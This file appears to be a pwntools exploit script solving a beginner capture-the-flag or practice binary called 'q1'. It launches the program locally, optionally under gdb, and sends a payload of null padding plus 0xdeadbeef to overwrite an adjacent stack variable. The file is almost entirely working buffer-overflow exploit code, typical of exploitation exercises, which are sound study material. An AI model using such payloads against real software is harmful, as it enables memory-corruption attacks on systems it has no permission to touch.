from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./q1"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *main+153
        continue
        x/xg $rbp-0x4
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"\x00" * 6
payload += p64(0xdeadbeef)

#p.recvuntil("")
p.sendline(payload)
print(p.recv())
#p.interactive()
